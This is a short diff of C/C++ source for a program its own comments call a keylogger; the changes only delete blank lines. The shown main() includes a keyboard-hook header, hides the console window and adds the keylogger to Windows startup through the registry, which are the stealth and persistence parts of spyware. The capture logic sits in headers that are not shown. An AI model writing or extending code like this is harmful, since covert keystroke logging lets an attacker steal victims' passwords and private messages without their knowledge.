@@ -1,5 +1,4 @@
 #pragma once
-
 #include "KeybHook.h"
 #include "RunOnStartup.h"
 
@@ -7,7 +6,6 @@ static void hide();
 
 int main()
 {
-	
 	hide(); // hide console window
 	addToStartup(); // starts keylogger at startup by adding it to the registry -> located in RunOnStartup.h
 	MSG Msg;
